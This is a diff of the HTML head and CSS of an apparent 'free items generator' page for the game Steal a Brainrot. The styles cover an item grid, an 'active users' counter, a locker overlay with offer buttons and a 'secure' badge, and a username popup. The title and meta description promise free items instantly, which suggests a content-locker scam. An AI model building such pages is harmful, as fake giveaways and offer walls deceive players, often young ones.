@@ -3,32 +3,79 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Steal a Brainrot</title>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@900&family=Orbitron:wght@900&display=swap" rel="stylesheet">
+    <meta name="description" content="Get free Steal a Brainrot items instantly! Select your favorite items and unlock them for free.">
+    <meta name="theme-color" content="#54d33a">
+    <title>Steal a Brainrot - Free Items Generator</title>
+    
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@900&family=Orbitron:wght@900&family=Inter:wght@400;600;700;900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
     <style>
-        /* Base Styles - Mobile First */
+        /* ===== CSS VARIABLES ===== */
+        :root {
+            --primary-green: #54d33a;
+            --secondary-green: #63e645;
+            --dark-green: #4f8a2f;
+            --gold: #FFD700;
+            --gold-dark: #d4af37;
+            --bg-dark: #1a1a1a;
+            --bg-darker: #121212;
+            --text-light: #e0e0e0;
+            --shadow-sm: 0 2px 8px rgba(0,0,0,0.1);
+            --shadow-md: 0 4px 15px rgba(0,0,0,0.2);
+            --shadow-lg: 0 8px 30px rgba(0,0,0,0.3);
+            --shadow-xl: 0 12px 40px rgba(0,0,0,0.4);
+            --transition-fast: 0.2s ease;
+            --transition-normal: 0.3s ease;
+        }
+
         * {
             box-sizing: border-box;
             -webkit-tap-highlight-color: transparent;
-        }
-        
-        html, body {
             margin: 0;
             padding: 0;
+            -webkit-touch-callout: none;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+        }
+
+        html, body {
             min-height: 100vh;
-            font-family: 'Cairo', Arial, sans-serif;
+            font-family: 'Cairo', 'Inter', Arial, sans-serif;
             position: relative;
             overflow-x: hidden;
             text-align: left;
-            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect fill="%2354d33a" width="100" height="100"/><rect fill="%2363e645" width="50" height="50" x="25" y="25" opacity="0.8"/><rect fill="%234f8a2f" width="30" height="30" x="35" y="35" opacity="0.6"/></svg>') repeat;
-            background-size: 100px 100px;
-            background-position: center;
-            -webkit-user-select: none;
-            -ms-user-select: none;
-            user-select: none;
+            background: linear-gradient(135deg, #0a1a0a 0%, #1a3a1a 25%, #0f2a0f 50%, #1a4a1a 75%, #0a1a0a 100%);
+            background-size: 400% 400%;
+            animation: gradientShift 20s ease infinite;
             touch-action: manipulation;
+        }
+
+        @keyframes gradientShift {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: 
+                radial-gradient(circle at 20% 50%, rgba(84, 211, 58, 0.15) 0%, transparent 50%),
+                radial-gradient(circle at 80% 80%, rgba(99, 230, 69, 0.1) 0%, transparent 50%),
+                radial-gradient(circle at 40% 20%, rgba(79, 138, 47, 0.1) 0%, transparent 50%);
+            pointer-events: none;
+            z-index: 0;
         }
 
         body.no-scroll {
@@ -38,237 +85,313 @@
             height: 100%;
         }
 
+        /* Disable zoom and double-tap */
+        * {
+            touch-action: manipulation;
+        }
+
+        img {
+            -webkit-user-drag: none;
+            -khtml-user-drag: none;
+            -moz-user-drag: none;
+            -o-user-drag: none;
+            user-drag: none;
+            pointer-events: none;
+        }
+
         .container {
             max-width: 1200px;
             margin: 0 auto;
             padding: 0 10px;
+            padding-bottom: 80px;
+            position: relative;
+            z-index: 1;
         }
 
         .logo-container {
             text-align: center;
-            padding: 10px 0 5px;
+            padding: 15px 0 10px;
+            animation: fadeInDown 0.8s ease;
+            position: relative;
+        }
+
+        .logo-container::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 60%;
+            height: 2px;
+            background: linear-gradient(to right, transparent, var(--primary-green), transparent);
+            opacity: 0.5;
         }
 
         .logo-container img {
-            max-width: 120px;
-            filter: drop-shadow(0 0 8px rgba(255, 215, 0, 0.5));
+            max-width: 140px;
+            height: auto;
+            filter: drop-shadow(0 0 15px rgba(255, 215, 0, 0.6)) drop-shadow(0 4px 20px rgba(84, 211, 58, 0.4));
+            transition: transform var(--transition-normal);
+            pointer-events: auto;
+            border-radius: 12px;
+            background: rgba(255, 255, 255, 0.05);
+            padding: 8px;
+            backdrop-filter: blur(10px);
+        }
+
+        .logo-container img:hover {
+            transform: scale(1.08) translateY(-3px);
+            filter: drop-shadow(0 0 20px rgba(255, 215, 0, 0.8)) drop-shadow(0 6px 25px rgba(84, 211, 58, 0.6));
         }
 
         .top-bar {
             display: flex;
             justify-content: center;
             align-items: center;
-            margin-bottom: 10px;
+            margin-bottom: 15px;
+            animation: fadeInUp 0.8s ease 0.2s both;
         }
 
         .active-users-box {
-            background: #0066cc;
-            border: 2px solid #fff;
-            border-radius: 10px;
-            padding: 8px 12px;
+            background: linear-gradient(135deg, rgba(0, 102, 204, 0.9), rgba(0, 85, 170, 0.9));
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-radius: 15px;
+            padding: 10px 16px;
             display: flex;
             align-items: center;
-            font-size: 0.9em;
-            min-width: 150px;
+            font-size: 0.95em;
+            min-width: 160px;
             margin: 0;
-            box-shadow: 0 1px 6px 0 rgba(0, 0, 0, 0.09);
+            box-shadow: 0 4px 20px rgba(0, 102, 204, 0.4), inset 0 1px 0 rgba(255, 255, 255, 0.2);
             font-weight: 900;
             font-family: 'Cairo', Arial, sans-serif;
-            height: 38px;
+            height: 42px;
             justify-content: center;
             cursor: pointer;
-            transition: transform 0.17s cubic-bezier(.17, .67, .83, .67);
-            will-change: transform;
+            transition: all var(--transition-normal);
             position: relative;
             overflow: hidden;
+            backdrop-filter: blur(10px);
         }
 
-        .active-users-box:after {
+        .active-users-box::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255, 255, 255, 0.2) 0%, transparent 70%);
+            animation: rotate 8s linear infinite;
+        }
+
+        .active-users-box::after {
             content: '';
             position: absolute;
             top: 0;
             left: -100%;
             width: 100%;
             height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
-            transition: 0.5s;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+            transition: var(--transition-normal);
         }
 
-        .active-users-box:hover:after {
+        .active-users-box:hover::after {
             left: 100%;
         }
 
-        .active-users-box:active {
-            transform: scale(1.09) rotate(-2deg);
-            box-shadow: 0 0 0 6px #fff5, 0 2px 6px #0003;
-            z-index: 2;
-            filter: brightness(1.08);
-            background: #0055aa;
+        .active-users-box:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 25px rgba(0, 102, 204, 0.5), inset 0 1px 0 rgba(255, 255, 255, 0.3);
+        }
+
+        @keyframes rotate {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
 
         .active-users-box span:first-child {
             color: #fff;
-            margin-right: 6px;
+            margin-right: 8px;
             font-weight: 900;
-            font-size: 0.9em;
+            font-size: 0.95em;
             letter-spacing: 1px;
+            position: relative;
+            z-index: 1;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
         }
 
         .active-users-count {
             font-weight: 900;
             font-family: 'Orbitron', 'Cairo', Arial, sans-serif;
-            margin-left: 6px;
-            font-size: 0.9em;
-            color: #FFD700;
-            text-shadow: 0 0 8px rgba(255, 215, 0, 0.8);
+            margin-left: 8px;
+            font-size: 1em;
+            color: var(--gold);
+            text-shadow: 0 0 10px rgba(255, 215, 0, 0.9), 0 2px 4px rgba(0, 0, 0, 0.3);
+            animation: pulse 2s infinite;
+            position: relative;
+            z-index: 1;
         }
 
         .select-title {
-            margin: 15px 0 10px;
+            margin: 20px 0 15px;
             text-align: center;
-            font-size: 1.1em;
+            font-size: 1.2em;
             color: #fff;
             font-family: 'Cairo', Arial, sans-serif;
-            letter-spacing: .4px;
+            letter-spacing: .5px;
             font-weight: 900;
-            text-shadow: 0 1px 5px #2225;
-            padding: 6px 0;
+            text-shadow: 0 2px 8px rgba(0,0,0,0.5), 0 0 20px rgba(84, 211, 58, 0.3);
+            padding: 10px 0;
             position: relative;
+            animation: fadeInUp 0.8s ease 0.3s both;
         }
 
-        .select-title:after {
+        .select-title::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 80%;
+            height: 100%;
+            background: linear-gradient(to right, transparent, rgba(84, 211, 58, 0.1), transparent);
+            border-radius: 10px;
+        }
+
+        .select-title::after {
             content: '';
             position: absolute;
             bottom: 0;
             left: 10%;
             width: 80%;
-            height: 2px;
-            background: linear-gradient(to right, transparent, #ffd700, transparent);
+            height: 3px;
+            background: linear-gradient(to right, transparent, var(--primary-green), var(--gold), var(--primary-green), transparent);
+            animation: expandWidth 1s ease 0.5s both;
+            border-radius: 2px;
+            box-shadow: 0 0 10px rgba(84, 211, 58, 0.6);
         }
 
-        /* Items Grid - Mobile First - 3 Columns */
         .items-grid {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
-            gap: 8px;
-            margin-bottom: 15px;
+            gap: 12px;
+            margin-bottom: 20px;
             width: 100%;
+            animation: fadeInUp 0.8s ease 0.4s both;
         }
 
         .item-card {
-            background: #fff;
-            border-radius: 8px;
-            box-shadow: 0 2px 8px #0002;
-            padding: 8px 4px;
+            background: linear-gradient(145deg, rgba(255, 255, 255, 0.95), rgba(255, 255, 255, 0.9));
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2), inset 0 1px 0 rgba(255, 255, 255, 0.5);
+            padding: 12px 6px;
             display: flex;
             flex-direction: column;
             align-items: center;
-            border: 1.5px solid #eee;
+            border: 2px solid rgba(255, 255, 255, 0.3);
             cursor: pointer;
-            transition: all 0.3s ease;
-            will-change: transform;
+            transition: all var(--transition-normal);
             overflow: hidden;
-            min-height: 100px;
+            min-height: 110px;
+            position: relative;
+            backdrop-filter: blur(10px);
         }
 
-        .item-card:before {
+        .item-card::before {
             content: '';
             position: absolute;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: linear-gradient(45deg, rgba(255, 215, 0, 0.1), rgba(255, 215, 0, 0.05));
+            background: linear-gradient(45deg, rgba(255, 215, 0, 0.15), rgba(84, 211, 58, 0.1));
             opacity: 0;
-            transition: opacity 0.3s;
+            transition: opacity var(--transition-normal);
         }
 
         .item-card:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 5px 12px rgba(0, 0, 0, 0.2);
+            transform: translateY(-5px) scale(1.02);
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3), 0 0 20px rgba(84, 211, 58, 0.2);
+            border-color: rgba(84, 211, 58, 0.5);
+        }
+
+        .item-card:hover::before {
+            opacity: 1;
         }
 
         .item-card:active {
-            transform: scale(1.05) rotate(-1deg);
-            box-shadow: 0 0 0 4px #ffd70033, 0 2px 8px #0003;
-            z-index: 2;
-            filter: brightness(1.08);
+            transform: scale(1.05) rotate(-2deg);
+            box-shadow: 0 0 0 4px rgba(255, 215, 0, 0.3), 0 8px 25px rgba(0, 0, 0, 0.3);
         }
 
         .item-card.selected {
-            background: linear-gradient(135deg, #ffd700, #ffbf00);
-            border: 1.5px solid #d4af37;
-            box-shadow: 0 0 12px rgba(255, 215, 0, 0.7);
-            animation: goldenGlow 1.5s infinite alternate;
+            background: linear-gradient(135deg, var(--gold), #ffbf00, var(--gold));
+            border: 2px solid var(--gold-dark);
+            box-shadow: 0 0 20px rgba(255, 215, 0, 0.8), 0 8px 30px rgba(255, 215, 0, 0.4), inset 0 1px 0 rgba(255, 255, 255, 0.3);
+            animation: goldenGlow 2s infinite alternate;
+            transform: scale(1.05);
         }
 
         @keyframes goldenGlow {
-            from {
-                box-shadow: 0 0 8px rgba(255, 215, 0, 0.5);
+            from { 
+                box-shadow: 0 0 15px rgba(255, 215, 0, 0.6), 0 8px 30px rgba(255, 215, 0, 0.3);
             }
-            to {
-                box-shadow: 0 0 20px rgba(255, 215, 0, 0.9);
+            to { 
+                box-shadow: 0 0 30px rgba(255, 215, 0, 1), 0 12px 40px rgba(255, 215, 0, 0.6);
             }
         }
 
         .item-img {
-            width: 60px;
-            height: 60px;
+            width: 65px;
+            height: 65px;
             object-fit: cover;
-            border-radius: 6px;
-            background: #eaeaea;
-            margin-bottom: 6px;
-            border: none;
+            border-radius: 10px;
+            background: linear-gradient(135deg, #eaeaea, #f5f5f5);
+            margin-bottom: 8px;
+            border: 2px solid rgba(255, 255, 255, 0.5);
             image-rendering: pixelated;
-            box-shadow: 0 0 10px #0001;
-            transition: box-shadow 0.12s, filter 0.12s;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.15);
+            transition: all var(--transition-fast);
             display: block;
             position: relative;
             z-index: 1;
+            pointer-events: auto;
         }
 
         .item-card.selected .item-img {
-            box-shadow: 0 0 12px rgba(255, 215, 0, 0.8);
-            filter: brightness(1.05) contrast(1.1);
+            box-shadow: 0 0 20px rgba(255, 215, 0, 0.9), 0 4px 15px rgba(255, 215, 0, 0.5);
+            filter: brightness(1.1) contrast(1.15);
+            border-color: var(--gold-dark);
         }
 
         .item-name {
-            font-size: 0.75em;
+            font-size: 0.8em;
             color: #333;
             font-family: 'Cairo', Arial, sans-serif;
             text-align: center;
             font-weight: 900;
-            letter-spacing: .1px;
+            letter-spacing: .2px;
             margin-bottom: 0;
-            line-height: 1.1;
+            line-height: 1.2;
             width: 100%;
             overflow: hidden;
             white-space: nowrap;
             text-overflow: ellipsis;
-            background: none;
-            border-radius: 0;
-            border: none;
-            margin-top: 0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            box-sizing: border-box;
-            min-height: 16px;
+            padding: 0 4px;
             position: relative;
             z-index: 1;
-            padding: 0 2px;
         }
 
         .item-card.selected .item-name {
             color: #8b7500;
-            text-shadow: 0 0 2px rgba(255, 215, 0, 0.5);
+            text-shadow: 0 0 3px rgba(255, 215, 0, 0.6), 0 1px 2px rgba(0, 0, 0, 0.3);
         }
 
-        /* Selection Controls */
         .selection-controls {
             text-align: center;
-            padding: 5px 0 15px;
-            min-height: 20px;
+            padding: 8px 0 20px;
+            min-height: 30px;
         }
 
         #continue-btn {
@@ -276,109 +399,315 @@
             position: fixed;
             bottom: 15px;
             left: 50%;
-            transform: translateX(-50%);
+            transform: translateX(-50%) translateY(50px);
             z-index: 1001;
-            padding: 10px 25px;
+            padding: 12px 30px;
             font-size: 1em;
             font-weight: 900;
             font-family: 'Cairo', Arial, sans-serif;
             color: white;
-            background: #333333;
+            background: linear-gradient(135deg, #333, #222);
             border: none;
             border-radius: 8px;
             cursor: pointer;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.4);
-            transition: all 0.3s ease;
+            box-shadow: var(--shadow-lg);
+            transition: all var(--transition-normal);
             text-transform: uppercase;
             letter-spacing: 1px;
+            opacity: 0;
+        }
+
+        #continue-btn.show {
+            display: block;
+            opacity: 1;
+            transform: translateX(-50%) translateY(0);
+            animation: slideUpButton 0.5s ease forwards;
+        }
+
+        @keyframes slideUpButton {
+            from {
+                opacity: 0;
+                transform: translateX(-50%) translateY(50px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(-50%) translateY(0);
+            }
         }
 
         #continue-btn:hover {
-            background: #444444;
+            background: linear-gradient(135deg, #444, #333);
             transform: translateX(-50%) translateY(-2px);
-            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.5);
+            box-shadow: 0 6px 25px rgba(0, 0, 0, 0.5);
         }
 
         #continue-btn:active {
-            background: #222222;
+            background: linear-gradient(135deg, #222, #111);
             transform: translateX(-50%) translateY(1px);
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.4);
         }
 
         #selection-limit-message {
             display: none;
             color: #ff4d4d;
             font-weight: bold;
-            font-size: 0.9em;
-            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.5);
+            font-size: 0.95em;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.5), 0 0 10px rgba(255, 77, 77, 0.5);
+            animation: shake 0.5s ease;
+            padding: 8px;
+            background: rgba(255, 77, 77, 0.1);
+            border-radius: 8px;
+            border: 1px solid rgba(255, 77, 77, 0.3);
         }
 
-        /* Notifications */
-        .cliameds {
+        /* ===== LOCKER OVERLAY - COMPACT & MOBILE OPTIMIZED ===== */
+        .locker-overlay {
+            display: none;
             position: fixed;
-            bottom: 60px;
-            left: 8px;
+            inset: 0;
+            background: rgba(0,0,0,0.92);
+            backdrop-filter: blur(5px);
             z-index: 9999;
-        }
-
-        .message {
-            background-color: rgba(135, 206, 250, 0.85);
-            display: flex;
-            font-size: .65rem;
+            justify-content: center;
             align-items: center;
-            padding: 6px 12px;
-            border-radius: 5px;
-            border: 1.5px solid rgba(238, 204, 159, 0.7);
-            position: relative;
-            overflow: hidden;
-            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.15);
+            padding: 15px;
+            animation: fadeIn 0.5s ease;
+            overflow-y: auto;
+            -webkit-overflow-scrolling: touch;
         }
 
-        .message:after {
+        .locker-box {
+            width: 100%;
+            max-width: 360px;
+            background: linear-gradient(145deg, rgba(84, 211, 58, 0.2), rgba(79, 138, 47, 0.25));
+            backdrop-filter: blur(20px);
+            border-radius: 20px;
+            padding: 20px;
+            text-align: center;
+            color: #fff;
+            box-shadow: 0 12px 40px rgba(84, 211, 58, 0.4), inset 0 1px 0 rgba(255, 255, 255, 0.2);
+            position: relative;
+            border: 2px solid rgba(84, 211, 58, 0.4);
+            animation: scaleIn 0.4s ease;
+        }
+
+        .locker-box::before {
             content: '';
             position: absolute;
-            top: -50%;
-            left: -60%;
-            width: 20%;
-            height: 200%;
-            background: rgba(255, 255, 255, 0.3);
-            transform: rotate(30deg);
-            transition: all 0.5s;
+            top: -2px;
+            left: -2px;
+            right: -2px;
+            bottom: -2px;
+            background: linear-gradient(45deg, var(--primary-green), var(--gold), var(--primary-green));
+            border-radius: 20px;
+            z-index: -1;
+            opacity: 0.3;
+            animation: borderGlow 3s ease infinite;
         }
 
-        .message:hover:after {
-            left: 120%;
+        @keyframes borderGlow {
+            0%, 100% { opacity: 0.3; }
+            50% { opacity: 0.6; }
         }
 
-        .message .img {
-            padding-right: 6px;
-            z-index: 2;
-        }
-
-        .message .img img {
-            width: 35px;
-            background: #fff;
+        .close-btn {
+            position: absolute;
+            top: 12px;
+            right: 12px;
+            font-size: 24px;
+            color: #fff;
+            cursor: pointer;
+            transition: all var(--transition-normal);
+            width: 32px;
+            height: 32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
             border-radius: 50%;
-            height: 35px;
-            border: 1.5px solid #fff;
-            box-shadow: 0 0 6px rgba(0, 0, 0, 0.3);
+            background: rgba(255,255,255,0.15);
+            z-index: 10;
+            line-height: 1;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
         }
 
-        .message .more {
-            z-index: 2;
+        .close-btn:hover {
+            background: rgba(255,255,255,0.25);
+            transform: rotate(90deg) scale(1.1);
+            box-shadow: 0 4px 15px rgba(255, 255, 255, 0.3);
         }
 
-        .message .more div:first-child {
-            font-weight: bold;
-            color: #0066cc;
+        .selected-items-preview {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin: 12px auto 15px;
+            flex-wrap: wrap;
         }
 
-        .message .more div:last-child {
-            color: #333;
+        .selected-item-preview {
+            width: 55px;
+            height: 55px;
+            border-radius: 12px;
+            object-fit: cover;
+            border: 3px solid var(--primary-green);
+            box-shadow: 0 0 15px rgba(84, 211, 58, 0.6), 0 4px 10px rgba(0, 0, 0, 0.3);
+            pointer-events: auto;
+            transition: transform var(--transition-normal);
+        }
+
+        .selected-item-preview:hover {
+            transform: scale(1.1) rotate(5deg);
+        }
+
+        .game-title {
+            font-size: 1.3em;
+            font-weight: 900;
+            color: #fff;
+            margin-bottom: 10px;
+            font-family: 'Cairo', Arial, sans-serif;
+            text-shadow: 0 2px 8px rgba(0, 0, 0, 0.5), 0 0 15px rgba(84, 211, 58, 0.5);
+        }
+
+        .secure-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: rgba(84, 211, 58, 0.25);
+            backdrop-filter: blur(10px);
+            padding: 6px 12px;
+            border-radius: 20px;
+            border: 1.5px solid var(--primary-green);
+            margin-bottom: 12px;
+            font-size: 0.75em;
+            box-shadow: 0 4px 15px rgba(84, 211, 58, 0.3);
+        }
+
+        .secure-badge i {
+            color: var(--primary-green);
+            font-size: 1em;
+            filter: drop-shadow(0 0 5px rgba(84, 211, 58, 0.8));
+        }
+
+        .instruction-text {
+            color: #fff;
+            font-size: 0.8em;
+            line-height: 1.5;
+            margin-bottom: 12px;
+            font-weight: 600;
+            text-shadow: 0 1px 3px rgba(0, 0, 0, 0.5);
+        }
+
+        .instruction-text .highlight {
+            color: var(--primary-green);
+            font-weight: 900;
+            text-shadow: 0 0 10px rgba(84, 211, 58, 0.8);
+        }
+
+        .note-box {
+            background: rgba(84, 211, 58, 0.2);
+            backdrop-filter: blur(10px);
+            border: 1.5px solid var(--primary-green);
+            border-radius: 10px;
+            padding: 10px 12px;
+            margin: 12px 0;
+            text-align: left;
+            box-shadow: 0 4px 15px rgba(84, 211, 58, 0.2);
+        }
+
+        .note-box strong {
+            color: var(--primary-green);
+            font-size: 0.8em;
+            text-shadow: 0 0 8px rgba(84, 211, 58, 0.6);
+        }
+
+        .note-box p {
+            color: #e0e0e0;
+            font-size: 0.75em;
+            margin-top: 5px;
+            line-height: 1.4;
+        }
+
+        .offers-prompt {
+            color: #fff;
+            font-size: 0.9em;
             font-weight: 700;
+            margin: 15px 0 12px;
+            text-align: left;
+            text-shadow: 0 1px 3px rgba(0, 0, 0, 0.5);
         }
 
-        /* Purchase Popup */
+        .offers-list {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .offer-button {
+            background: linear-gradient(135deg, var(--primary-green), var(--secondary-green));
+            border: 2px solid rgba(255, 255, 255, 0.2);
+            border-radius: 12px;
+            padding: 12px 14px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            cursor: pointer;
+            transition: all var(--transition-normal);
+            text-align: left;
+            box-shadow: 0 4px 15px rgba(84, 211, 58, 0.4), inset 0 1px 0 rgba(255, 255, 255, 0.2);
+            width: 100%;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .offer-button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: var(--transition-normal);
+        }
+
+        .offer-button:hover::before {
+            left: 100%;
+        }
+
+        .offer-button:hover {
+            background: linear-gradient(135deg, var(--secondary-green), var(--primary-green));
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(84, 211, 58, 0.6), inset 0 1px 0 rgba(255, 255, 255, 0.3);
+            border-color: rgba(255, 255, 255, 0.3);
+        }
+
+        .offer-button:active {
+            transform: translateY(0);
+        }
+
+        .offer-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 8px;
+            object-fit: cover;
+            flex-shrink: 0;
+            background: #fff;
+            padding: 4px;
+            pointer-events: auto;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
+            border: 1px solid rgba(0, 0, 0, 0.1);
+        }
+
+        .offer-text {
+            flex: 1;
+            color: #000;
+            font-weight: 800;
+            font-size: 0.85em;
+            line-height: 1.3;
+            text-shadow: 0 1px 2px rgba(255, 255, 255, 0.5);
+        }
+
+        /* ===== PURCHASE POPUP ===== */
         .purchase-popup {
             display: none;
             position: fixed;
@@ -386,95 +715,109 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background-color: rgba(0, 0, 0, 0.9);
+            background-color: rgba(0, 0, 0, 0.95);
+            backdrop-filter: blur(5px);
             z-index: 1000;
             justify-content: center;
             align-items: center;
+            animation: fadeIn 0.4s ease;
         }
 
         .popup-content {
-            background-color: #333;
-            padding: 15px;
-            border-radius: 8px;
+            background: linear-gradient(145deg, #333, #222, #333);
+            padding: 20px;
+            border-radius: 20px;
             width: 90%;
-            max-width: 300px;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
+            max-width: 320px;
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.7), 0 0 30px rgba(84, 211, 58, 0.2);
             text-align: center;
             color: white;
             margin: auto;
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
+            position: relative;
+            animation: scaleIn 0.4s ease;
+            border: 2px solid rgba(84, 211, 58, 0.3);
         }
 
         .popup-header {
             position: relative;
-            padding-bottom: 12px;
-            margin-bottom: 12px;
+            padding-bottom: 15px;
+            margin-bottom: 15px;
         }
 
         .popup-header h3 {
-            font-size: 18px;
+            font-size: 20px;
             margin: 0;
             color: white;
             font-weight: 700;
+            text-shadow: 0 2px 8px rgba(0, 0, 0, 0.5);
         }
 
-        .popup-header:after {
+        .popup-header::after {
             content: '';
             position: absolute;
             bottom: 0;
             left: 10%;
             right: 10%;
             height: 2px;
-            background-color: #666;
+            background: linear-gradient(to right, transparent, var(--gold), var(--primary-green), var(--gold), transparent);
+            border-radius: 2px;
         }
 
         .selected-images-container {
             display: flex;
             justify-content: center;
             align-items: center;
-            gap: 8px;
-            margin: 12px auto;
+            gap: 10px;
+            margin: 15px auto;
             flex-wrap: wrap;
         }
 
         .item-popup-image-small {
-            width: 50px;
-            height: 50px;
+            width: 55px;
+            height: 55px;
             border-radius: 50%;
             object-fit: cover;
-            border: 2px solid #444;
-            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+            border: 3px solid var(--gold);
+            box-shadow: 0 0 15px rgba(255, 215, 0, 0.6), 0 4px 10px rgba(0, 0, 0, 0.3);
+            pointer-events: auto;
+            transition: transform var(--transition-normal);
+        }
+
+        .item-popup-image-small:hover {
+            transform: scale(1.1) rotate(5deg);
         }
 
         .item-confirm {
-            font-size: 14px;
-            margin: 12px 0;
+            font-size: 15px;
+            margin: 15px 0;
             color: white;
             font-weight: 700;
-            line-height: 1.3;
+            line-height: 1.4;
+            text-shadow: 0 1px 3px rgba(0, 0, 0, 0.5);
         }
 
         .input-group {
-            margin-bottom: 15px;
+            margin-bottom: 18px;
             text-align: left;
-        }
-
-        .input-group label {
-            display: none;
         }
 
         .input-group input {
             width: 100%;
-            padding: 10px;
+            padding: 14px;
             background-color: white;
             color: #333;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-            font-size: 13px;
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            font-size: 14px;
             font-weight: 600;
+            transition: all var(--transition-normal);
+            box-shadow: inset 0 2px 5px rgba(0, 0, 0, 0.1);
+        }
+
+        .input-group input:focus {
+            outline: none;
+            border-color: var(--gold);
+            box-shadow: 0 0 0 4px rgba(255, 215, 0, 0.2), inset 0 2px 5px rgba(0, 0, 0, 0.1);
         }
 
         .input-group input::placeholder {
@@ -485,32 +828,49 @@
         .popup-buttons {
             display: flex;
             justify-content: space-between;
-            gap: 8px;
+            gap: 10px;
         }
 
         .cancel-btn {
-            background-color: #555;
+            background: linear-gradient(135deg, #555, #444);
             color: white;
-            border: none;
-            padding: 10px;
-            border-radius: 4px;
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            padding: 14px;
+            border-radius: 10px;
             font-weight: bold;
             cursor: pointer;
             flex: 1;
-            font-size: 13px;
+            font-size: 14px;
+            transition: all var(--transition-normal);
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+        }
+
+        .cancel-btn:hover {
+            background: linear-gradient(135deg, #666, #555);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.4);
         }
 
         .free-btn {
-            background-color: white;
-            border: none;
-            padding: 10px;
-            border-radius: 4px;
+            background: linear-gradient(135deg, white, #f0f0f0);
+            border: 2px solid rgba(255, 215, 0, 0.3);
+            padding: 14px;
+            border-radius: 10px;
             cursor: pointer;
             flex: 1;
             display: flex;
             justify-content: center;
             align-items: center;
-            gap: 5px;
+            gap: 6px;
+            transition: all var(--transition-normal);
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+        }
+
+        .free-btn:hover {
+            background: linear-gradient(135deg, #f0f0f0, white);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
+            border-color: rgba(255, 215, 0, 0.5);
         }
 
         .free-btn .free-badge {
@@ -518,22 +878,21 @@
             font-weight: 900;
             display: flex;
             align-items: center;
-            font-size: 13px;
+            font-size: 14px;
         }
 
         .free-btn .free-icon {
-            width: 16px;
-            height: 16px;
+            width: 18px;
+            height: 18px;
             background-image: url('https://tse4.mm.bing.net/th?id=OIP.AZtpRYaMROCrDtdpzAYzvgHaH5&pid=Api&P=0&h=180');
             background-size: contain;
             background-repeat: no-repeat;
         }
 
-        /* Loading Animation */
         .folding {
-            margin: 15px auto;
-            width: 60px;
-            height: 60px;
+            margin: 20px auto;
+            width: 70px;
+            height: 70px;
             position: relative;
             transform: rotateZ(45deg);
         }
@@ -542,10 +901,11 @@
             position: absolute;
             top: 30%;
             right: 30%;
-            width: 25px;
-            height: 25px;
-            background-color: #000;
